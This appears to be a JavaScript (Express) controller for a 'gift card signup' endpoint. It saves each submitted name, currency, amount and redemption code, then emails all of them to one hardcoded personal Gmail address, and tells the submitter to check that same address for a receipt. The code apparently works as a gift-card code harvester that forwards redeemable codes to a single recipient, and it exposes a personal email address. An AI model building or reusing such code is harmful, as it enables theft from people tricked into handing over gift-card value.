require('dotenv').config();
const GiftCardModel = require('../models/GiftCardMOdel');
const { sendEmail } = require('../helpers/sendMail');
const { paymentReceiptTemplate } = require('../helpers/emailTemplate');

exports.GiftCardSignup = async (req, res) => {
  try {
    const { Name, Currency, Amount, Redemptioncode } = req.body;

    if (!Name || !Currency || !Amount || !Redemptioncode ) {
      return res.status(400).json({
        message: `Please enter all details`
      });
    }

    // Always create a new GiftCard document (even if duplicate)
    const newGiftCard = new GiftCardModel({
      Name,
      Currency,
      Amount,
      Redemptioncode,
   
    });

    // Save it without worrying about duplicates
    const savedGiftCard = await newGiftCard.save();

    const userEmail2 = "khonarichie01@gmail.com"

    // Send the payment receipt email
    const mailOptions = {
      email:  userEmail2,
      subject: "Gift Card Purchase Receipt",
      html: paymentReceiptTemplate(
        savedGiftCard.Name,
        savedGiftCard.Currency,
        savedGiftCard.Amount,
        savedGiftCard.Redemptioncode
      ),
    };

    await sendEmail(mailOptions);

    // Return a success response
    return res.status(201).json({
      message: `Gift card saved successfully. Check your email: ${userEmail2} for the receipt.`,
      data: savedGiftCard,
    });

  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
